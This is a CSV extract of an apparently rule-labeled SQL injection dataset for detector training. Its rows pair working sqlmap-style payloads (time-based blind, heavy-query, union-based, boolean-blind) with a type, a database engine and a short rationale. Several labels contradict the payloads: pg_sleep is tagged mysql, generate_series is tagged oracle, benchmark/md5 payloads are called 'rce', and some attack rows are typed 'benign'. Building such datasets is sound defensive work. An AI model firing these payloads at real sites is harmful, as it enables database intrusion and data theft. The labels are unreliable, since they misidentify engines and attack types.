row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4410,1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 7015 = 7015,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4411,"1'|| ( select 'xuof' from dual where 8794 = 8794 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,oracle,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on oracle",rule-based
4412,1' ) ) as cpwx where 5378 = 5378 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4413,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'ywxe' like 'ywxe",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
4414,1 ) where 7956 = 7956 or sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
4415,"-9774' ) ) ) union all select 6954,6954,6954#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4416,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'ayjb' like 'ayjb",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4417,"1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 8189 = 8189",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
4418,"1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4419,"1 ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 9333 = 9333",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
4420,"1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4421,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'mnod' = 'mnod",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
4422,"-7700%' ) union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4423,"1 ) as pcnd where 4589 = 4589 union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4424,1'+ ( select yjyp where 9696 = 9696,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4425,1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,,boolean_blind,postgresql,0.95,8214 = 8214 and detected — boolean_blind injection (priority 8) on postgresql,rule-based
4426,"-9574%' ) ) union all select 5645,5645,5645,5645,5645,5645,5645--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
